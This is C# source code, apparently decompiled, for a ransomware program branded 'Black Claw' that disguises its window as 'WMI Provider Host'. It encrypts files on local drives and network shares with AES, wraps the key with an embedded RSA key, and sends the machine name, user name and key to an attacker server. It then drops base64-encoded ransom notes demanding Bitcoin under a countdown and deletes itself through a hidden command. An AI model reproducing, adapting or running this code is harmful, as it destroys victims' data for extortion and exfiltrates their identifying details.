using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winapp;

public class Form1 : Form
{
	private string Note = "PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+IDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPiA8dGl0bGU+UkVDT1ZFUiBZT1VSIEZJTEVTIDwvdGl0bGU+IDxIVEE6QVBQTElDQVRJT04gaWNvbj0iIyIgV0lORE9XU1RBVEU9Im1heGltaXplIiBTSE9XSU5UQVNLQkFSPSJ5ZXMiIFNZU01FTlU9Im5vIiBDQVBUSU9OPSJubyIgc2Nyb2xsPSJubyIgLz4gPHN0eWxlPiBib2R5IHsgZm9udC1mYW1pbHk6ICdMdWNpZGEgQ29uc29sZSc7IHRleHQtYWxpZ246IGNlbnRlcjsgfSAuY2VudGVyIHsgZGlzcGxheTogYmxvY2s7IG1hcmdpbi1sZWZ0OiBhdXRvOyBtYXJnaW4tcmlnaHQ6IGF1dG87IHdpZHRoOiAyMDBweDsgfSBiIHsgZm9udC1mYW1pbHk6ICdGcmFua2xpbiBHb3RoaWMgTWVkaXVtJzsgZm9udC1zaXplOiAzMHB4OyB9IC50ZXh0IHsgdGV4dC1hbGlnbjogbGVmdDsgcGFkZGluZy1sZWZ0OiAyNTBweDsgfSAuaGlnaGxpZ2h0IHsgYmFja2dyb3VuZC1jb2xvcjogI2Q4ZTVlODsgcmVzaXplOm5vbmU7IGJhY2tncm91bmQtY29sb3I6I2U4ZjBmMjsgfSBjb2RlIHsgZm9udC13ZWlnaHQ6IGJvbGQ7IGZvbnQtc2l6ZTogMTlweDsgfSAuYWxlcnQgeyBjb2xvcjogcmVkOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgZm9udC1mYW1pbHk6ICdGcmFua2xpbiBHb3RoaWMgTWVkaXVtJzsgZm9udC1zaXplOiAyN3B4OyBwYWRkaW5nLWxlZnQ6IDIwcHg7IGZvbnQtd2VpZ2h0OiBib2xkOyB9IC50aW1lciB7IGNvbG9yOiByZWQ7IGJhY2tncm91bmQtY29sb3I6IGJsYWNrOyBmb250LWZhbWlseTogJ0ZyYW5rbGluIEdvdGhpYyBNZWRpdW0nOyBmb250LXNpemU6IDYwcHg7IGZvbnQtd2VpZ2h0OiBib2xkOyB3aWR0aDogYXV0bzsgfSAucGFkIHsgcGFkZGluZy1sZWZ0OiAzMHB4OyB9IC50aXRyIHsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0gLm5hbWUgeyBmb250LWZhbWlseTogJ0FyaWFsIEJsYWNrJzsgfSA8L3N0eWxlPjwvaGVhZD48Ym9keT4gPGRpdiBjbGFzcz0iY29udGVudCI+IDxkaXYgY2xhc3M9ImNlbnRlciI+IDxpbWcgc3JjPSJodHRwczovL2kuaWJiLmNvL1JDMkhqWEgvYi5qcGciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj4gPC9kaXY+IDxiPkFsbCB5b3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQhIDwvYj4gPGRpdiBzdHlsZT0icGFkZGluZy10b3A6MjBweDsiIGNsYXNzPSJ0ZXh0Ij4gPGJyPiBBbGwgeW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkIChXSVRIIEFFUytSU0EpIGR1ZSB0byBhIHNlY3VyaXR5IHByb2JsZW0gd2l0aCB5b3VyIFBDLiBJZiB5b3Ugd2FudCB0byByZXN0b3JlIHRoZW0sIHdyaXRlIHVzIGFuIGVtYWlsIGFuZCBhdHRhY2ggb25lIG9mIGVuY3J5cHRlZCBmaWxlcyhsZXNzIHRoYW4gMW1iKTogPGEgY2xhc3M9ImhpZ2hsaWdodCIgaHJlZj0ibWFpbHRvOiBiY2xhd0BoaXRsZXIucm9ja3MiPiBiY2xhd0BoaXRsZXIucm9ja3MgPC9hPiA8YnI+IG9yIHNlbmQgYSBtZXNzYWdlIHRvIG91ciB0ZWxlZ3JhbSBhY2NvdW50OiA8YSBjbGFzcz0iaGlnaGxpZ2h0IiBocmVmPSJodHRwczpcXHQubWVcYl9jbGF3Ij5ULm1lXEJfQ2xhdyA8L2E+IDxicj4gPGJyPiBpbiBjYXNlIG9mIG5vIGFud3NlciBpbiAyIGhvdXJzIGNvbnRhY3Qgd2l0aCB1cyB0aHJvdWdodCBUZWxlZ3JhbSBhY2NvdW50IDxhIGNsYXNzPSJoaWdobGlnaHQiIGhyZWY9Imh0dHBzOlxcdC5tZVxiX2NsYXciPlQubWVcQl9DbGF3IDwvYT4gPGJyPiA8YnI+IEluY2x1ZGUgdGhpcyBpZCBpbiB5b3VyIG1lc3NhZ2Ugb3IgZW1haWw6PGJyIC8+IDx0ZXh0YXJlYSByb3dzPSI3IiBjb2xzPSI1MyIgY2xhc3M9ImhpZ2hsaWdodCI+JUlEJTwvdGV4dGFyZWE+IDxicj4gPGJyPiA8L2Rpdj4gPGEgY2xhc3M9ImFsZXJ0Ij5ZT1UgSEFWRSBPTkxZIDQ4IEhPVVJTIFRPIENPTlRBQ1QgVVMuIFdIRU4gVEhJUyBUSU1FIEVORFMgVEhFIFBSSUNFIFdJTEwgQkUgVFdJQ0UgQVMgTVVDSCA8L2E+IDxicj4gPGJyPiA8cCBpZD0iZGVtbyIgY2xhc3M9InRpbWVyIj4yZCAwaCAwbSAwcyA8L3A+IDxzY3JpcHQ+IHZhciBjb3VudERvd25EYXRlID0gbmV3IERhdGUoIiVUSU1FUiUiKS5nZXRUaW1lKCk7IHZhciB4ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkgeyB2YXIgbm93ID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7IHZhciBkaXN0YW5jZSA9IGNvdW50RG93bkRhdGUgLSBub3c7IHZhciBkYXlzID0gTWF0aC5mbG9vcihkaXN0YW5jZSAvICgxMDAwICogNjAgKiA2MCAqIDI0KSk7IHZhciBob3VycyA9IE1hdGguZmxvb3IoKGRpc3RhbmNlICUgKDEwMDAgKiA2MCAqIDYwICogMjQpKSAvICgxMDAwICogNjAgKiA2MCkpOyB2YXIgbWludXRlcyA9IE1hdGguZmxvb3IoKGRpc3RhbmNlICUgKDEwMDAgKiA2MCAqIDYwKSkgLyAoMTAwMCAqIDYwKSk7IHZhciBzZWNvbmRzID0gTWF0aC5mbG9vcigoZGlzdGFuY2UgJSAoMTAwMCAqIDYwKSkgLyAxMDAwKTsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRlbW8iKS5pbm5lckhUTUwgPSBkYXlzICsgImQgIiArIGhvdXJzICsgImggIiArIG1pbnV0ZXMgKyAibSAiICsgc2Vjb25kcyArICJzICI7IGlmIChkaXN0YW5jZSA8IDApIHsgY2xlYXJJbnRlcnZhbCh4KTsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRlbW8iKS5pbm5lckhUTUwgPSAiRVhQSVJFRCEgVEhFIFBSSUNFIElTIFRXSUNFIEFTIE1VQ0ggTk9XIjsgfSB9LCAxMDAwKTsgPC9zY3JpcHQ+IDxkaXYgc3R5bGU9Im1hcmdpbi1ib3R0b206MzBweDsiIGNsYXNzPSJ0ZXh0Ij4gPGEgY2xhc3M9InRpdHIiPiMgRnJlZSBkZWNyeXB0aW9uIGFzIGd1YXJhbnRlZSA8L2E+IDxicj4gPGJyPiA8ZGl2IGNsYXNzPSJwYWQiPiA8YT5CZWZvcmUgcGF5aW5nIHlvdSBjYW4gc2VuZCB1cCB0byAxIGZpbGUgZm9yIGZyZWUgZGVjcnlwdGlvbi4gPC9hPiA8L2Rpdj4gPGJyPiA8YnI+IDxhIGNsYXNzPSJ0aXRyIj4jIEhvdyB0byBvYnRhaW4gQml0Y29pbiA8L2E+IDxicj4gPGJyPiA8ZGl2IGNsYXNzPSJwYWQiPiA8YT5UaGUgZWFzaWVzdCB3YXkgdG8gYnV5IEJpdGNvaW4gaW4gTG9jYWxiaXRjb2lucy5jb20gd2Vic2l0ZS4gPC9hPiA8YnI+IDxhIGhyZWY9Imh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zIj5odHRwczovL2xvY2FsYml0Y29pbnMuY29tL2J1eV9iaXRjb2lucyA8L2E+IDxicj4gPGJyPkFsc28geW91IGNhbiBmaW5kIG90aGVyIHBsYWNlcyB0byBidXkgQml0Y29pbnMgYW5kIGJlZ2lubmVyIGd1aWRlIGhlcmU6IDxicj4gPGEgaHJlZj0iaHR0cHM6Ly93d3cuY29pbmRlc2suY29tL2xlYXJuL2JpdGNvaW4tMTAxL2hvdy1jYW4taS1idXktYml0Y29pbnMiPmh0dHBzOi8vd3d3LmNvaW5kZXNrLmNvbS9sZWFybi9iaXRjb2luLTEwMS9ob3ctY2FuLWktYnV5LWJpdGNvaW5zIDwvYT4gPC9kaXY+IDxicj4gPGJyPiA8YSBjbGFzcz0idGl0ciI+IyBBVFRFTlRJT04gISEhIDwvYT4gPGJyPiA8YnI+IDxkaXYgY2xhc3M9InBhZCI+IDxhPkRPIE5PVCBSRU5BTUUgVEhFIEZJTEVTLiA8L2E+IDwvZGl2PiA8L2Rpdj4gPGEgY2xhc3M9Im5hbWUiPkJMQUNLIENMQVcgUkFOU09NV0FSRSA8L2E+IDwvZGl2PjwvYm9keT48L2h0bWw+";

	private string Note2 = "QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCAoV0lUSCBBRVMrUlNBKSBkdWUgdG8gYSBzZWN1cml0eSBwcm9ibGVtIHdpdGggeW91ciBQQy4gSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtLCB3cml0ZSB1cyBhbiBlbWFpbCBhbmQgYXR0YWNoIG9uZSBvZiBlbmNyeXB0ZWQgZmlsZXMobGVzcyB0aGFuIDFtYik6IGJjbGF3QGhpdGxlci5yb2NrcyAKb3Igc2VuZCBhIG1lc3NhZ2UgdG8gb3VyIHRlbGVncmFtIGFjY291bnQ6IFQubWVcQl9DbGF3IAoKaW4gY2FzZSBvZiBubyBhbndzZXIgaW4gMiBob3VycyBjb250YWN0IHdpdGggdXMgdGhyb3VnaHQgVGVsZWdyYW0gYWNjb3VudCBULm1lXEJfQ2xhdyAKCkluY2x1ZGUgdGhpcyBpZCBpbiB5b3VyIG1lc3NhZ2Ugb3IgZW1haWw6ICVJRCUKCgpZT1UgSEFWRSBPTkxZIDQ4IEhPVVJTIFRPIENPTlRBQ1QgVVMuIFdIRU4gVEhJUyBUSU1FIEVORFMgVEhFIFBSSUNFIFdJTEwgQkUgVFdJQ0UgQVMgTVVDSCAKCiMgRnJlZSBkZWNyeXB0aW9uIGFzIGd1YXJhbnRlZSAKQmVmb3JlIHBheWluZyB5b3UgY2FuIHNlbmQgdXAgdG8gMSBmaWxlIGZvciBmcmVlIGRlY3J5cHRpb24uIAoKCiMgQVRURU5USU9OICEhISAKRE8gTk9UIFJFTkFNRSBUSEUgRklMRVMuIAoKCkJMQUNLIENMQVcgUkFOU09NV0FSRSA=";

	private byte[] PasswordBytes;

	private byte[] SaltBytes;

	private string PublicKey;

	private IContainer components = null;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	public void MakeNote(string path)
	{
		try
		{
			File.WriteAllText(Path.Combine(path, "RECOVER YOUR FILES.hta"), Note);
			File.WriteAllText(Path.Combine(path, "RECOVER YOUR FILES.txt"), Note2);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string inputFile)
	{
		try
		{
			using FileStream fileStream = File.Open(inputFile, FileMode.Open, FileAccess.ReadWrite);
			long length = new FileInfo(inputFile).Length;
			int num = 1049088;
			if (length < 1L)
			{
				return;
			}
			if (length < num)
			{
				num = Convert.ToInt32(length);
			}
			byte[] array = new byte[num];
			fileStream.Read(array, 0, array.Length);
			fileStream.Position = 0L;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(PasswordBytes, SaltBytes, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(array, 0, array.Length);
					cryptoStream.Close();
				}
				byte[] array2 = memoryStream.ToArray();
				fileStream.Write(array2, 0, array2.Length);
			}
			fileStream.Close();
			if (PublicKey.Length <= 10)
			{
				File.Move(inputFile, inputFile + $".[{PublicKey}].bclaw");
			}
			else
			{
				File.Move(inputFile, inputFile + ".bclaw");
			}
		}
		catch (Exception)
		{
		}
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes, byte[] saltBytes)
	{
		byte[] result = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private void button2_Click(object sender, EventArgs e)
	{
	}

	private List<string> GetLocations()
	{
		List<string> list = new List<string>();
		list.AddRange(Directory.GetLogicalDrives());
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Network Shortcuts");
		try
		{
			list.AddRange(Directory.GetDirectories(path));
		}
		catch (Exception)
		{
		}
		try
		{
			NetworkBrowser networkBrowser = new NetworkBrowser();
			foreach (string networkComputer in networkBrowser.getNetworkComputers())
			{
				ShareCollection shares = ShareCollection.GetShares(networkComputer);
				if (shares == null)
				{
					continue;
				}
				foreach (Share item in shares)
				{
					if (!item.IsFileSystem)
					{
						continue;
					}
					try
					{
						DirectoryInfo root = item.Root;
						DirectoryInfo[] directories = root.GetDirectories();
						for (int i = 0; i < directories.Length; i++)
						{
							list.Add(directories[i].FullName);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	private async void button1_Click(object sender, EventArgs e)
	{
		RNGCryptoServiceProvider provider = new RNGCryptoServiceProvider();
		byte[] temp = new byte[136];
		provider.GetBytes(temp);
		List<byte> KeyBytes = new List<byte>();
		KeyBytes.AddRange(temp);
		SaltBytes = KeyBytes.GetRange(0, 8).ToArray();
		PasswordBytes = KeyBytes.GetRange(7, 128).ToArray();
		byte[] PrivateKeyBytes = rsa.Encryption(temp, "<RSAKeyValue><Modulus>vvF6Mw7IE1wEUFK3xz+5MVPegrAJlrVy3T4OPB/MFPK4vXXHyTHtCbvlUdT7znxA94mdVBQOeJOUNG0TRa28w8LY7KrPxNPPoY8LDiTq51c8r6+0ZfeA2wqsg1DMHxQopvhLaQZQlRTPHj5E1tQ9yVv089BvHz3ORpk2P/jdUQSMnAhPAFpjPtjUEzcIEu5PRGCOMIMS70lQfAnp/3ef1C7cLV1WVWYJCdNxRZyl9k00dvdR0JWYpuqBCP20RfiSoXuney5gLZS0NLcicEVa/dQpUaMJ6dZwfS0rc0STA3GJuOuwxaVTSXs5NYWAS3hF3anqpxL/UFTsKIdo1wFSvQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		PublicKey = Convert.ToBase64String(PrivateKeyBytes);
		try
		{
			HttpClient client2 = new HttpClient();
			string responseString = await client2.GetStringAsync(string.Format("https://claw.black/gen.php?id={0}&k={1}&domain={2}&user={3}", "1", PublicKey, Convert.ToBase64String(Encoding.UTF8.GetBytes(Environment.MachineName)), Convert.ToBase64String(Encoding.UTF8.GetBytes(Environment.UserName))));
			if (responseString.Trim() == "no")
			{
				((Form)this).Close();
			}
			if (responseString.Length <= 10 && responseString.Trim() != "")
			{
				PublicKey = responseString;
			}
		}
		catch (Exception)
		{
		}
		Note = Encoding.UTF8.GetString(Convert.FromBase64String(Note));
		Note = Note.Replace("%TIMER%", DateTime.Now.AddDays(2.0).ToString("MMM dd, yyyy HH:mm:ss")).Replace("%ID%", PublicKey);
		Note2 = Encoding.UTF8.GetString(Convert.FromBase64String(Note2));
		Note2 = Note2.Replace("%ID%", PublicKey);
		List<string> locs = GetLocations();
		string path;
		foreach (string loc in locs)
		{
			try
			{
				SemaphoreSlim semaphoreSlim = new SemaphoreSlim(70);
				List<Task> tasks = new List<Task>();
				List<string> dirs = new List<string> { loc };
				while (true)
				{
					try
					{
						if (dirs.Count < 1)
						{
							break;
						}
						if (dirs[0].StartsWith("C:\\Windows") || dirs[0].StartsWith("C:\\Program Files"))
						{
							dirs.RemoveAt(0);
							continue;
						}
						try
						{
							string[] files = Directory.GetFiles(dirs[0]);
							if (files.Length >= 1)
							{
								for (int i = 0; i < files.Length; i++)
								{
									try
									{
										if (!files[i].EndsWith("RECOVER YOUR FILES.txt") && !files[i].EndsWith("RECOVER YOUR FILES.hta") && !files[i].EndsWith(".lnk") && !files[i].EndsWith(".bclaw"))
										{
											await semaphoreSlim.WaitAsync();
											path = files[i];
											tasks.Add(Task.Run(delegate
											{
												EncryptFile(path);
												semaphoreSlim.Release();
											}));
										}
									}
									catch (Exception)
									{
									}
								}
							}
						}
						catch (Exception)
						{
						}
						MakeNote(dirs[0]);
						dirs.AddRange(Directory.GetDirectories(dirs[0]));
						dirs.RemoveAt(0);
						continue;
					}
					catch (Exception)
					{
						dirs.RemoveAt(0);
						continue;
					}
				}
				await Task.WhenAll(tasks);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			HttpClient client = new HttpClient();
			await client.GetStringAsync(string.Format("https://claw.black/done.php?id={0}&k={1}&domain={2}&user={3}", "1", PublicKey, Convert.ToBase64String(Encoding.UTF8.GetBytes(Environment.MachineName)), Convert.ToBase64String(Encoding.UTF8.GetBytes(Environment.UserName))));
		}
		catch (Exception)
		{
		}
		SaltBytes = null;
		PasswordBytes = null;
		PublicKey = null;
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.get_ExecutablePath() + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		GC.Collect();
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(270, 112));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(493, 314));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("WMI Provider Host");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
